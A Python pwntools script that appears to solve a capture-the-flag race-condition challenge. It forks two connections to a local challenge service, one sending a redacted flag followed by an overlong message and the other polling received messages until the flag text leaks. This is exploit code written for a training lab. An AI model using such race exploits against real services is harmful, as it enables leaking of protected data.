from pwn import *
import os
p = process("/challenge/babyrace_level11.1")

if os.fork() == 0:
    p2 = connect("127.0.0.1", 1337)
    p2.recvuntil("Function (send_message/send_redacted_flag/receive_message/quit):")

    while True:

        p2.sendline("receive_message")

        # i=0
        # while True:
        #     a = p1.recvline()
        #     if a.find(b"message[11]") != -1:
        #         break
        #     if a.find(b"Paused") != -1:
        #         p1.sendline("AAAAAAA")
        #         i+=1

        # p1.sendline("AAAAAAA")
        # p2.sendline("AAAAAAA")
        a = p2.recvuntil("Function (send_message/send_redacted_flag/receive_message/quit):")
        #p2.close()
        if a.find(b"college") != -1:
            p2.close()
            print(a)
            exit()

else:
    p1 = connect("127.0.0.1", 1337)

    while True:

        p1.recvuntil("Function (send_message/send_redacted_flag/receive_message/quit):")
        p1.sendline("send_redacted_flag")
        # while True:
        #     a = p1.recvline()
        #     if a.find(b"Paused") != -1:
        #         p1.sendline("AAAAAAA")
        #     elif a.find(b"Function") != -1:
        #         break
        p1.recvuntil("Function (send_message/send_redacted_flag/receive_message/quit):")
        p1.sendline("send_message")
        #p2.recvuntil("Function (login/logout/win_authed/quit):")
        p1.recvuntil(" ")
        p1.sendline("123456789ABCD" + "A"*100)

        #p1.close()
        #p2.close()